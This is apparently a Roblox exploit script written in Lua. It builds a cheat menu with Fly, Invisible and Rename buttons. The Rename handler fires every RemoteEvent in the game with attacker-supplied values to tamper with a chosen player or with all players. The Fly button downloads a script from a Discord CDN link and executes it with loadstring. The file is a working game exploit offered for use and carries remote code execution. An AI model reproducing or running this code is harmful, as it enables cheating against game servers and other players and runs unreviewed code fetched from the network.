-- Instances:
local top = Instance.new("Frame")
local back = Instance.new("Frame")
local top_2 = Instance.new("TextLabel")
local credits = Instance.new("TextLabel")
local target = Instance.new("TextBox")
local queue = Instance.new("TextLabel")
local rename = Instance.new("TextButton")
local name = Instance.new("TextBox")
local fly = Instance.new("TextButton")
local invisible = Instance.new("TextButton")
local character = game:GetService("Players").LocalPlayer.Character
local handle, weld
local grips = {}

--Functions:
local function FindDescendantOf(instance, name, classname)
	for i,v in pairs(instance:GetDescendants()) do
		if v.Name:find(name) and v.ClassName == classname then
			return v
		end
	end
end

function setDisplayDistance(distance)
	for _,player in pairs(game.Players:GetPlayers()) do if player.Character and player.Character:FindFirstChildWhichIsA("Humanoid") then player.Character:FindFirstChildWhichIsA("Humanoid").NameDisplayDistance = distance player.Character:FindFirstChildWhichIsA("Humanoid").HealthDisplayDistance = distance end end
end

local function webImport(file)
	return loadstring(game:HttpGet(file))()
end

--Properties:
top.Name = "top"
top.Parent = game.StarterGui.main
top.Active = true
top.BackgroundColor3 = Color3.fromRGB(47, 47, 47)
top.BackgroundTransparency = 1.000
top.BorderColor3 = Color3.fromRGB(29, 29, 29)
top.Draggable = true
top.Position = UDim2.new(0.612145662, -4, 0.311965823, -2)
top.Size = UDim2.new(0, 291, 0, 30)

back.Name = "back"
back.Parent = top
back.BackgroundColor3 = Color3.fromRGB(47, 47, 47)
back.BackgroundTransparency = 0.300
back.BorderColor3 = Color3.fromRGB(29, 29, 29)
back.BorderSizePixel = 0
back.Position = UDim2.new(-0.00343642617, 0, 2.36666656, 0)
back.Size = UDim2.new(0, 293, 0, 252)

top_2.Name = "top"
top_2.Parent = top
top_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
top_2.BackgroundTransparency = 1.000
top_2.Position = UDim2.new(0.00343642617, 0, 1.96666574, 0)
top_2.Size = UDim2.new(0, 291, 0, 50)
top_2.Font = Enum.Font.SourceSansLight
top_2.Text = "Fucked"
top_2.TextColor3 = Color3.fromRGB(255, 255, 255)
top_2.TextSize = 45.000
top_2.TextYAlignment = Enum.TextYAlignment.Bottom

credits.Name = "credits"
credits.Parent = top
credits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
credits.BackgroundTransparency = 1.000
credits.Position = UDim2.new(0.00343642617, 0, 3.39999962, 0)
credits.Size = UDim2.new(0, 291, 0, 23)
credits.Font = Enum.Font.SourceSansLight
credits.Text = "Script by lemonsxeedd, UI by Unverified"
credits.TextColor3 = Color3.fromRGB(255, 255, 255)
credits.TextSize = 17.000
credits.TextWrapped = true

target.Name = "target"
target.Parent = top
target.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
target.BackgroundTransparency = 0.400
target.Position = UDim2.new(0.0206185561, 0, 7.53333235, 0)
target.Size = UDim2.new(0, 278, 0, 33)
target.Font = Enum.Font.SourceSans
target.Text = ""
target.TextColor3 = Color3.fromRGB(255, 255, 255)
target.TextSize = 23.000

queue.Name = "queue"
queue.Parent = top
queue.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
queue.BackgroundTransparency = 1.000
queue.Position = UDim2.new(0.15463917, 0, 10.0333328, 0)
queue.Size = UDim2.new(0, 201, 0, 23)
queue.Font = Enum.Font.SourceSans
queue.Text = "Replication Queue: 0"
queue.TextColor3 = Color3.fromRGB(255, 0, 4)
queue.TextSize = 20.000
queue.TextWrapped = true

rename.Name = "rename"
rename.Parent = top
rename.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
rename.BackgroundTransparency = 0.500
rename.BorderSizePixel = 0
rename.Position = UDim2.new(0.0206185561, 0, 5.86217356, 0)
rename.Size = UDim2.new(0, 278, 0, 40)
rename.Font = Enum.Font.SourceSansLight
rename.Text = "Rename"
rename.TextColor3 = Color3.fromRGB(255, 255, 255)
rename.TextSize = 23.000

name.Name = "name"
name.Parent = top
name.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
name.BackgroundTransparency = 0.400
name.Position = UDim2.new(0.017563574, 0, 8.9333334, 0)
name.Size = UDim2.new(0, 278, 0, 33)
name.Font = Enum.Font.SourceSans
name.Text = ""
name.TextColor3 = Color3.fromRGB(255, 255, 255)
name.TextSize = 23.000

fly.Name = "fly"
fly.Parent = top
fly.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
fly.BackgroundTransparency = 0.500
fly.BorderSizePixel = 0
fly.Position = UDim2.new(0.0209998693, 0, 4.25, 0)
fly.Size = UDim2.new(0, 131, 0, 40)
fly.Font = Enum.Font.SourceSansLight
fly.Text = "Fly"
fly.TextColor3 = Color3.fromRGB(255, 255, 255)
fly.TextSize = 23.000

invisible.Name = "invisible"
invisible.Parent = top
invisible.BackgroundColor3 = Color3.fromRGB(172, 172, 172)
invisible.BackgroundTransparency = 0.500
invisible.BorderSizePixel = 0
invisible.Position = UDim2.new(0.519281685, 0, 4.25, 0)
invisible.Size = UDim2.new(0, 132, 0, 40)
invisible.Font = Enum.Font.SourceSansLight
invisible.Text = "Invisible"
invisible.TextColor3 = Color3.fromRGB(255, 255, 255)
invisible.TextSize = 23.000

-- CHECK GAME --
if game.PlaceId == 8915359921 then
	queue.Text = "Replication Queue: 1"
end

-- SLAVE'S WORK -- 
for i,slaves in pairs(game:GetDescendants()) do
	rename.MouseButton1Down:Connect(function()
		local ohok = FindDescendantOf(target.Text, game:GetService("Players"), "Player")

		if target.Text == "all" then
			if slaves:IsA("RemoteEvent") then
				slaves:FireServer(target.Text, {Value = target.Text})
			end
		elseif ohok.Character then
			if slaves:IsA("RemoteEvent") and slaves:IsDescendantOf(ohok.Character) then
				slaves:FireServer(target.Text, {Value = target.Text})
			end
		end
	end)
end

--BUTTONS--
invisible.MouseButton1Down:Connect(function()
	-- thanks to notvroom for script
	if handle then handle:Destroy() end if weld then weld:Destroy() end
	handle = Instance.new("Part", workspace) handle.Name = "Handle" handle.Transparency = 1 handle.CanCollide = false handle.Size = Vector3.new(2, 1, 1)
	weld = Instance.new("Weld", handle) weld.Part0 = handle weld.Part1 = character.HumanoidRootPart weld.C0 = CFrame.new(0, 1100-1.5, 0)
	setDisplayDistance(1100+100)
	workspace.CurrentCamera.CameraSubject = handle
	character.HumanoidRootPart.CFrame = character.HumanoidRootPart.CFrame * CFrame.new(0, 1100, 0)
	character.Humanoid.HipHeight = 1100
	character.Humanoid:ChangeState(11)
	for _,child in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do if child:IsA("Tool") then grips[child] = child.Grip end end
end)

fly.MouseButton1Click:Connect(function()
	webImport("https://cdn.discordapp.com/attachments/975584026435940383/984779026684055582/fly.lua")
end)
